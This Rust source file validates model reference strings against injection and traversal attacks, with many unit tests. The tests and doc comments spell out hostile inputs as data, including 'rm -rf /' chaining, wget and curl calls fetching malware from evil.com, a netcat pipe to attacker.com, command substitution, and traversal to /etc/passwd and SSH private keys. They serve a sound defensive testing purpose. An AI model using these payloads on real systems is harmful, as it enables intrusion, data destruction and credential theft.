//! Model reference validation applet
//!
//! Validates model references to prevent injection attacks.

use crate::error::{Result, ValidationError};

/// Validate model reference
///
/// # Rules
/// - Length <= 512 characters
/// - Not empty
/// - Character whitelist: `[a-zA-Z0-9\-_/:\.]+`
/// - No null bytes
/// - No shell metacharacters: `;`, `|`, `&`, `$`, `` ` ``, `\n`, `\r`
/// - No path traversal sequences
///
/// # Arguments
/// * `s` - Model reference string
///
/// # Returns
/// * `Ok(())` if valid
/// * `Err(ValidationError)` with specific failure reason
///
/// # Examples
/// ```
/// use input_validation::validate_model_ref;
///
/// // Valid
/// assert!(validate_model_ref("meta-llama/Llama-3.1-8B").is_ok());
/// assert!(validate_model_ref("hf:org/repo").is_ok());
/// assert!(validate_model_ref("file:models/model.gguf").is_ok());
///
/// // Invalid
/// assert!(validate_model_ref("model; rm -rf /").is_err());
/// assert!(validate_model_ref("model\n[ERROR] Fake").is_err());
/// ```
///
/// # Errors
/// * `ValidationError::Empty` - String is empty
/// * `ValidationError::TooLong` - Exceeds 512 characters
/// * `ValidationError::NullByte` - Contains null byte
/// * `ValidationError::ShellMetacharacter` - Contains shell metacharacter
/// * `ValidationError::PathTraversal` - Contains path traversal sequence
/// * `ValidationError::InvalidCharacters` - Contains invalid character
///
/// # Security
/// Prevents:
/// - SQL injection: `"'; DROP TABLE models; --"`
/// - Command injection: `"model.gguf; rm -rf /"`
/// - Log injection: `"model\n[ERROR] Fake log"`
/// - Path traversal: `"file:../../../../etc/passwd"`
pub fn validate_model_ref(s: &str) -> Result<()> {
    const MAX_LEN: usize = 512;
    
    // Check empty first (fast check, prevents processing empty strings)
    if s.is_empty() {
        return Err(ValidationError::Empty);
    }
    
    // Check length early (fast check, prevents processing oversized inputs)
    // This is critical for model provisioning to prevent resource exhaustion
    if s.len() > MAX_LEN {
        return Err(ValidationError::TooLong {
            actual: s.len(),
            max: MAX_LEN,
        });
    }
    
    // Check for null bytes (security-critical, must happen early)
    // Null bytes can cause C string truncation in downstream model loaders
    if s.contains('\0') {
        return Err(ValidationError::NullByte);
    }
    
    // Check for shell metacharacters (injection prevention)
    // CRITICAL: Model provisioners often invoke shell commands (wget, curl, git clone)
    // These characters could allow arbitrary command execution
    const SHELL_METACHARACTERS: &[char] = &[
        ';',  // Command chaining: "model.gguf; rm -rf /"
        '|',  // Pipe redirection: "model.gguf | malicious"
        '&',  // Background execution: "model.gguf & malicious"
        '$',  // Variable expansion: "model$(whoami).gguf"
        '`',  // Command substitution: "model`whoami`.gguf"
        '\n', // Log injection: "model\n[ERROR] Fake log"
        '\r', // CRLF injection: "model\r\nFake log"
    ];
    for c in s.chars() {
        if SHELL_METACHARACTERS.contains(&c) {
            return Err(ValidationError::ShellMetacharacter { char: c });
        }
    }
    
    // Check for path traversal (security-critical)
    // CRITICAL: Model provisioners download to specific directories
    // Path traversal could allow writing to arbitrary locations
    // Must check both Unix (../) and Windows (..\) variants
    if s.contains("../") || s.contains("..\\") {
        return Err(ValidationError::PathTraversal);
    }
    
    // Validate characters: alphanumeric + dash + underscore + slash + colon + dot
    // Early termination on first invalid character for performance
    // Whitelist approach: only allow known-safe characters for model references
    //
    // Allowed patterns:
    // - HuggingFace: "org/repo" or "hf:org/repo"
    // - File paths: "file:path/to/model.gguf"
    // - URLs: "https://example.com/model.gguf" (colon and slash)
    // - Versions: "model-v1.2.3" or "model.v2"
    for c in s.chars() {
        if !c.is_alphanumeric() && !matches!(c, '-' | '_' | '/' | ':' | '.') {
            return Err(ValidationError::InvalidCharacters {
                found: c.to_string(),
            });
        }
    }
    
    // Additional robustness: Verify character count matches byte count
    // This ensures no multi-byte UTF-8 characters slipped through
    // Model references should be ASCII-only for maximum compatibility
    let char_count = s.chars().count();
    if char_count != s.len() {
        // Multi-byte UTF-8 detected (though is_alphanumeric should catch this)
        return Err(ValidationError::InvalidCharacters {
            found: "[multi-byte UTF-8]".to_string(),
        });
    }
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_valid_model_refs() {
        assert!(validate_model_ref("meta-llama/Llama-3.1-8B").is_ok());
        assert!(validate_model_ref("hf:org/repo").is_ok());
        assert!(validate_model_ref("file:models/model.gguf").is_ok());
        assert!(validate_model_ref("model-name").is_ok());
        assert!(validate_model_ref("org_name/model_name").is_ok());
    }
    
    #[test]
    fn test_sql_injection_blocked() {
        assert!(matches!(
            validate_model_ref("'; DROP TABLE models; --"),
            Err(ValidationError::ShellMetacharacter { char: ';' })
        ));
    }
    
    #[test]
    fn test_command_injection_blocked() {
        assert!(matches!(
            validate_model_ref("model; rm -rf /"),
            Err(ValidationError::ShellMetacharacter { char: ';' })
        ));
        assert!(matches!(
            validate_model_ref("model | cat"),
            Err(ValidationError::ShellMetacharacter { char: '|' })
        ));
        assert!(matches!(
            validate_model_ref("model && ls"),
            Err(ValidationError::ShellMetacharacter { char: '&' })
        ));
    }
    
    #[test]
    fn test_log_injection_blocked() {
        assert!(matches!(
            validate_model_ref("model\n[ERROR] Fake"),
            Err(ValidationError::ShellMetacharacter { char: '\n' })
        ));
        assert!(matches!(
            validate_model_ref("model\r\nFake"),
            Err(ValidationError::ShellMetacharacter { char: '\r' })
        ));
    }
    
    #[test]
    fn test_path_traversal_blocked() {
        assert_eq!(
            validate_model_ref("file:../../../../etc/passwd"),
            Err(ValidationError::PathTraversal)
        );
        assert_eq!(
            validate_model_ref("hf:../../../etc/passwd"),
            Err(ValidationError::PathTraversal)
        );
    }
    
    #[test]
    fn test_null_byte_blocked() {
        assert_eq!(
            validate_model_ref("model\0name"),
            Err(ValidationError::NullByte)
        );
    }
    
    #[test]
    fn test_empty_rejected() {
        assert_eq!(
            validate_model_ref(""),
            Err(ValidationError::Empty)
        );
    }
    
    #[test]
    fn test_too_long_rejected() {
        let long = "a".repeat(513);
        assert!(matches!(
            validate_model_ref(&long),
            Err(ValidationError::TooLong { actual: 513, max: 512 })
        ));
    }
    
    #[test]
    fn test_boundary_at_512() {
        // Exactly at 512 characters
        let exact = "a".repeat(512);
        assert!(validate_model_ref(&exact).is_ok());
        
        // One under limit
        let under = "a".repeat(511);
        assert!(validate_model_ref(&under).is_ok());
    }
    
    #[test]
    fn test_dollar_sign_injection() {
        // Dollar sign (command substitution)
        assert!(matches!(
            validate_model_ref("model$(whoami)"),
            Err(ValidationError::ShellMetacharacter { char: '$' })
        ));
    }
    
    #[test]
    fn test_backtick_injection() {
        // Backtick (command substitution)
        assert!(matches!(
            validate_model_ref("model`whoami`"),
            Err(ValidationError::ShellMetacharacter { char: '`' })
        ));
    }
    
    #[test]
    fn test_double_ampersand_injection() {
        assert!(matches!(
            validate_model_ref("model && malicious"),
            Err(ValidationError::ShellMetacharacter { char: '&' })
        ));
    }
    
    #[test]
    fn test_log_injection_variants() {
        // Only newline
        assert!(matches!(
            validate_model_ref("model\nfake"),
            Err(ValidationError::ShellMetacharacter { char: '\n' })
        ));
        
        // Only carriage return
        assert!(matches!(
            validate_model_ref("model\rfake"),
            Err(ValidationError::ShellMetacharacter { char: '\r' })
        ));
    }
    
    #[test]
    fn test_path_traversal_windows() {
        assert_eq!(
            validate_model_ref("file:..\\..\\windows\\system32"),
            Err(ValidationError::PathTraversal)
        );
    }
    
    #[test]
    fn test_dots_without_traversal() {
        // Single dots are allowed
        assert!(validate_model_ref("model.v2.gguf").is_ok());
    }
    
    #[test]
    fn test_more_invalid_characters() {
        // Space
        assert!(matches!(
            validate_model_ref("model name"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        // At symbol
        assert!(matches!(
            validate_model_ref("model@version"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        // Hash
        assert!(matches!(
            validate_model_ref("model#tag"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        // Percent
        assert!(matches!(
            validate_model_ref("model%20name"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
    }
    
    #[test]
    fn test_early_termination_order() {
        // Null byte checked before shell metacharacters
        assert_eq!(
            validate_model_ref("model\0; rm -rf /"),
            Err(ValidationError::NullByte)
        );
        
        // Shell metacharacter checked before invalid characters
        assert!(matches!(
            validate_model_ref("model; @#$"),
            Err(ValidationError::ShellMetacharacter { char: ';' })
        ));
    }
    
    // ========== CLIENT SDK ROBUSTNESS TESTS ==========
    
    #[test]
    fn test_sdk_huggingface_patterns() {
        // Standard HuggingFace org/repo format
        assert!(validate_model_ref("meta-llama/Llama-3.1-8B").is_ok());
        assert!(validate_model_ref("mistralai/Mistral-7B-v0.1").is_ok());
        assert!(validate_model_ref("TheBloke/Llama-2-7B-GGUF").is_ok());
        
        // With hf: prefix
        assert!(validate_model_ref("hf:meta-llama/Llama-3.1-8B").is_ok());
        assert!(validate_model_ref("hf:org/repo").is_ok());
        
        // Nested paths (subfolders)
        assert!(validate_model_ref("org/repo/subfolder/model.gguf").is_ok());
        
        // Version numbers
        assert!(validate_model_ref("model-v1.2.3").is_ok());
        assert!(validate_model_ref("model.v2.0").is_ok());
        assert!(validate_model_ref("model_v3").is_ok());
    }
    
    #[test]
    fn test_sdk_file_path_patterns() {
        // File protocol
        assert!(validate_model_ref("file:models/llama.gguf").is_ok());
        assert!(validate_model_ref("file:path/to/model.bin").is_ok());
        
        // Relative paths (safe, no traversal)
        assert!(validate_model_ref("models/llama.gguf").is_ok());
        assert!(validate_model_ref("cache/model.bin").is_ok());
        
        // File extensions
        assert!(validate_model_ref("model.gguf").is_ok());
        assert!(validate_model_ref("model.bin").is_ok());
        assert!(validate_model_ref("model.safetensors").is_ok());
        assert!(validate_model_ref("model.pt").is_ok());
    }
    
    #[test]
    fn test_sdk_url_patterns() {
        // HTTPS URLs (colon and slashes allowed)
        assert!(validate_model_ref("https://example.com/model.gguf").is_ok());
        assert!(validate_model_ref("https://huggingface.co/org/repo/model.bin").is_ok());
        
        // HTTP URLs
        assert!(validate_model_ref("http://example.com/model.gguf").is_ok());
        
        // Deep paths
        assert!(validate_model_ref("https://cdn.example.com/models/v1/llama.gguf").is_ok());
    }
    
    #[test]
    fn test_sdk_command_injection_prevention() {
        // wget/curl command injection attempts
        assert!(matches!(
            validate_model_ref("model.gguf; wget http://evil.com/malware"),
            Err(ValidationError::ShellMetacharacter { char: ';' })
        ));
        
        assert!(matches!(
            validate_model_ref("model.gguf && curl http://evil.com/malware"),
            Err(ValidationError::ShellMetacharacter { char: '&' })
        ));
        
        assert!(matches!(
            validate_model_ref("model.gguf | nc evil.com 1234"),
            Err(ValidationError::ShellMetacharacter { char: '|' })
        ));
        
        // Command substitution in download URLs
        assert!(matches!(
            validate_model_ref("https://example.com/$(whoami).gguf"),
            Err(ValidationError::ShellMetacharacter { char: '$' })
        ));
        
        assert!(matches!(
            validate_model_ref("https://example.com/`whoami`.gguf"),
            Err(ValidationError::ShellMetacharacter { char: '`' })
        ));
    }
    
    #[test]
    fn test_sdk_path_traversal_prevention() {
        // Prevent writing outside model directory
        assert_eq!(
            validate_model_ref("../../../etc/passwd"),
            Err(ValidationError::PathTraversal)
        );
        
        assert_eq!(
            validate_model_ref("file:../../../../root/.ssh/id_rsa"),
            Err(ValidationError::PathTraversal)
        );
        
        // Windows path traversal
        assert_eq!(
            validate_model_ref("..\\..\\windows\\system32\\config"),
            Err(ValidationError::PathTraversal)
        );
        
        // Mixed with valid prefix
        assert_eq!(
            validate_model_ref("hf:org/../../../etc/passwd"),
            Err(ValidationError::PathTraversal)
        );
    }
    
    #[test]
    fn test_sdk_whitespace_injection() {
        // Spaces could break shell command parsing
        assert!(matches!(
            validate_model_ref("model name.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        // Tab
        assert!(matches!(
            validate_model_ref("model\tname.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        // Leading/trailing whitespace
        assert!(matches!(
            validate_model_ref(" model.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        assert!(matches!(
            validate_model_ref("model.gguf "),
            Err(ValidationError::InvalidCharacters { .. })
        ));
    }
    
    #[test]
    fn test_sdk_special_characters_rejection() {
        // Characters that could break URL parsing or shell commands
        let dangerous_chars = "!@#$%^&*()+={}[]|\\<>?~`\"'";
        for c in dangerous_chars.chars() {
            let model_ref = format!("model{}name.gguf", c);
            let result = validate_model_ref(&model_ref);
            assert!(
                result.is_err(),
                "Should reject dangerous char: {} ({:?})", c, c
            );
        }
    }
    
    #[test]
    fn test_sdk_unicode_rejection() {
        // Unicode could cause issues with file systems and URLs
        assert!(matches!(
            validate_model_ref("modèl.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        assert!(matches!(
            validate_model_ref("模型.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
        
        assert!(matches!(
            validate_model_ref("model🚀.gguf"),
            Err(ValidationError::InvalidCharacters { .. })
        ));
    }
    
    #[test]
    fn test_sdk_null_byte_prevention() {
        // Null bytes could truncate strings in C-based downloaders
        assert_eq!(
            validate_model_ref("model\0.gguf"),
            Err(ValidationError::NullByte)
        );
        
        assert_eq!(
            validate_model_ref("https://example.com/model\0malicious"),
            Err(ValidationError::NullByte)
        );
    }
    
    #[test]
    fn test_sdk_log_injection_prevention() {
        // Prevent fake log entries during model download
        assert!(matches!(
            validate_model_ref("model.gguf\n[SUCCESS] Downloaded malware"),
            Err(ValidationError::ShellMetacharacter { char: '\n' })
        ));
        
        assert!(matches!(
            validate_model_ref("model.gguf\r\n[INFO] Backdoor installed"),
            Err(ValidationError::ShellMetacharacter { char: '\r' })
        ));
    }
    
    #[test]
    fn test_sdk_length_limits() {
        // Prevent resource exhaustion in model provisioner
        let very_long = "a".repeat(513);
        assert!(matches!(
            validate_model_ref(&very_long),
            Err(ValidationError::TooLong { actual: 513, max: 512 })
        ));
        
        // Exactly at limit should work
        let exact = "a".repeat(512);
        assert!(validate_model_ref(&exact).is_ok());
    }
    
    #[test]
    fn test_sdk_empty_reference() {
        // Empty model reference should be rejected
        assert_eq!(validate_model_ref(""), Err(ValidationError::Empty));
    }
    
    #[test]
    fn test_sdk_version_formats() {
        // Common version formats in model names
        assert!(validate_model_ref("model-v1.0").is_ok());
        assert!(validate_model_ref("model-v2.1.3").is_ok());
        assert!(validate_model_ref("model.v3").is_ok());
        assert!(validate_model_ref("model_v4.0.0").is_ok());
        
        // Semantic versioning
        assert!(validate_model_ref("llama-2.7b-v1.0.0").is_ok());
    }
    
    #[test]
    fn test_sdk_quantization_formats() {
        // Common quantization formats in model names
        assert!(validate_model_ref("model-q4_0.gguf").is_ok());
        assert!(validate_model_ref("model-q5_k_m.gguf").is_ok());
        assert!(validate_model_ref("model-q8_0.bin").is_ok());
        assert!(validate_model_ref("model-fp16.safetensors").is_ok());
    }
    
    #[test]
    fn test_sdk_real_world_examples() {
        // Real-world model references that should work
        let valid_refs = vec![
            "meta-llama/Llama-3.1-8B-Instruct",
            "mistralai/Mistral-7B-Instruct-v0.2",
            "TheBloke/Llama-2-7B-Chat-GGUF",
            "hf:TheBloke/Mistral-7B-Instruct-v0.2-GGUF",
            "file:models/llama-2-7b-chat.Q4_K_M.gguf",
            "https://huggingface.co/TheBloke/Llama-2-7B-GGUF/resolve/main/llama-2-7b.Q4_K_M.gguf",
            "models/llama-2-7b-chat.gguf",
            "llama-2-7b-q4_0.gguf",
        ];
        
        for model_ref in valid_refs {
            assert!(
                validate_model_ref(model_ref).is_ok(),
                "Should accept valid model ref: {}", model_ref
            );
        }
    }
    
    #[test]
    fn test_sdk_attack_scenarios() {
        // Real attack scenarios that should be blocked
        let attacks = vec![
            // Command injection
            ("model.gguf; rm -rf /", "command chaining"),
            ("model.gguf && malware", "command chaining"),
            ("model.gguf | nc attacker.com 1234", "pipe redirection"),
            ("model$(whoami).gguf", "command substitution"),
            ("model`id`.gguf", "backtick substitution"),
            
            // Path traversal
            ("../../../etc/passwd", "path traversal"),
            ("file:../../../../root/.ssh/id_rsa", "file path traversal"),
            
            // Log injection
            ("model\n[ERROR] Fake error", "newline injection"),
            ("model\r\n[SUCCESS] Fake success", "CRLF injection"),
            
            // Null byte
            ("model\0.gguf", "null byte truncation"),
        ];
        
        for (attack, description) in attacks {
            assert!(
                validate_model_ref(attack).is_err(),
                "Should block attack: {}", description
            );
        }
    }
    
    #[test]
    fn test_sdk_char_count_vs_byte_count() {
        // ASCII model references (char count == byte count)
        let ascii = "meta-llama/Llama-3.1-8B";
        assert_eq!(ascii.len(), ascii.chars().count());
        assert!(validate_model_ref(ascii).is_ok());
        
        // UTF-8 model references (char count < byte count) should be rejected
        let utf8 = "modèl/café";
        assert_eq!(utf8.len(), 12); // bytes
        assert_eq!(utf8.chars().count(), 10); // chars
        assert!(validate_model_ref(utf8).is_err());
    }
}
